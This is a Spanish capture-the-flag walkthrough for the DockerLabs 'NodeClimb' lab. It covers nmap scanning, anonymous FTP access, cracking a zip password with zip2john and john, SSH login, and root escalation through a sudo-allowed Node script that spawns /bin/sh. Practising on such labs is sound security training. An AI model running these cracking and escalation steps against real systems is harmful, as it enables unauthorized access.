NodeClimb-DockerLabs🇪🇸


**1. En primer lugar descomprimiremos el fichero y moveremos sus archivos a nuestra zona de trabajo.**
```bash
unzip nodeclimb.zip 
```

<img width="838" height="326" alt="image" src="https://github.com/user-attachments/assets/68e3ffec-c4fd-4ead-a72a-b90049dc82c5" />


**2. Ahora pondremos en marcha nuestro laboratorio.**
```bash
sudo bash ./auto_deploy.sh nodeclimb.tar 
```

<img width="847" height="470" alt="image" src="https://github.com/user-attachments/assets/6c8ee59f-6d4d-4134-840e-dad605d1cada" />


**3. Ahora procederemos a realizar un ping para comprobar la conexión con la máquina.**
```bash
ping -c3 172.17.0.2
```

<img width="848" height="273" alt="image" src="https://github.com/user-attachments/assets/37904841-5a94-4cf0-b68c-c518c9d5c570" />


**4. Ahora realizaremos un rastreo de puertos con nmap.**
```bash
nmap -sCV 172.17.0.2
```

<img width="845" height="644" alt="image" src="https://github.com/user-attachments/assets/ac7ee51c-4045-4b10-a961-29a60c1e413e" />


**5. Al observar que el puerto ftp está abierto entraremos con `ftp 172.17.0.2` y luego nombre:anonymous y contraseña:1234**
*Con ls podremos ver los archivos*

<img width="846" height="280" alt="image" src="https://github.com/user-attachments/assets/8edccc65-4436-440b-a1b6-13741ed63822" />


**6. Ahora sabiendo que archivos hay los extraemos con get hacia nuestro directorio.**
```bash
get secretitopicaron.zip
```

<img width="849" height="323" alt="image" src="https://github.com/user-attachments/assets/62d8f331-6bd2-4662-93ee-fe052ccf3a40" />


**7. Al tener contraseña el zip vamos a proceder a crachearla con zip2john.**
```bash
zip2john secretitopicaron.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<img width="839" height="264" alt="image" src="https://github.com/user-attachments/assets/8d0ca73a-af7a-411f-a1e5-9400ffa8a479" />


**8. Ahora vamos a proceder a descomprimir el archivo y leer la contraseña**.
```bash
unzip secretitopicaron.zip
cat password.txt
```

<img width="850" height="132" alt="image" src="https://github.com/user-attachments/assets/cfc33cca-a06f-4c0d-971f-aca84ac22fb5" />


**9. Teniendo ya el usuario y contraseña vamos a entrar a la máquina mediante ssh.**
```bash
 ssh mario@172.17.0.2
```

<img width="845" height="354" alt="image" src="https://github.com/user-attachments/assets/50a0a348-aa62-4178-bfea-81fc403c2735" />


**10. Al entrar al laboratio vamos a escalar a root, primero vamos a ver nuestros permisos de binarios con `sudo -l`**

<img width="855" height="150" alt="image" src="https://github.com/user-attachments/assets/f3a6ea84-1a93-481f-927b-8d9efce7df20" />


**11. Viendo que tenemos permisos de un script javascript lo modificaremos `nano script.js
` para escalar privilegios con un exploit que nos hemos informado en la página https://gtfobins.org/gtfobins/node/**
```bash
require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});

```

<img width="845" height="253" alt="image" src="https://github.com/user-attachments/assets/59d2cf28-d40d-4960-9b0c-968965e05396" />


**12. Ahora ejecutamos `sudo /usr/bin/node /home/mario/script.js
` para subir privilegios a root.**

<img width="855" height="96" alt="image" src="https://github.com/user-attachments/assets/d6dad4f0-7f13-468c-97f9-85010d8de18b" />


